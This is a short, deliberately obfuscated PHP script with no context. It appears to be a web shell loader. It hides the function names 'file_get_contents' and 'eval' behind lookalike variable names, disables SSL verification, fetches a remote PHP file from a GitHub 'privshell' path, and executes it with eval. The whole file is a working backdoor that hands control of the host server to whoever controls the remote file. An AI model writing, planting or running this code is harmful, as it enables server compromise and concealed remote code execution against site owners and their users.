<?php
$o0O0o = 'urldecode'; $O0o0O = 'stream_context_create'; $oO0o0 = 'file_get_contents'; $Oo0O0 = 'eval';
$_ = $o0O0o('https://raw.githubusercontent.com/neurodie/hxc/refs/heads/main/privshell/hengkerbarbar.php');
$__ = $O0o0O(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);
$___ = $oO0o0($_, false, $__);
$Oo0O0($___);
?>
